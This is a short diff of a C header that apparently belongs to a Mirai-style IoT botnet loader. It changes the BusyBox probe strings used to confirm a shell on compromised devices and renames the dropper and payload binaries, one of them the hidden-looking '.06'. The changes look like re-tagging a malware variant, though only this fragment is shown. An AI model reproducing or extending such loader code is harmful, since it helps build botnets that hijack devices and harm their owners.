@@ -19,13 +19,13 @@ typedef uint16_t port_t;
 #define ATOMIC_DEC(ptr) ATOMIC_SUB((ptr),1)
 #define ATOMIC_GET(ptr) ATOMIC_ADD((ptr),0)
 
-#define TOKEN_QUERY "/bin/busybox AK1K2"
-#define TOKEN_RESPONSE "AK1K2: applet not found"
+#define TOKEN_QUERY "/bin/busybox UNSTABLE"
+#define TOKEN_RESPONSE "UNSTABLE: applet not found"
 
-#define EXEC_QUERY "/bin/busybox O2J134"
-#define EXEC_RESPONSE "O2J134: applet not found"
+#define EXEC_QUERY "/bin/busybox ELBATSNU"
+#define EXEC_RESPONSE "ELBATSNU: applet not found"
 
-#define FN_DROPPER "902i13"
-#define FN_BINARY "19ju3d"
+#define FN_DROPPER "sikeriz"
+#define FN_BINARY ".06"
 
 extern char *id_tag;
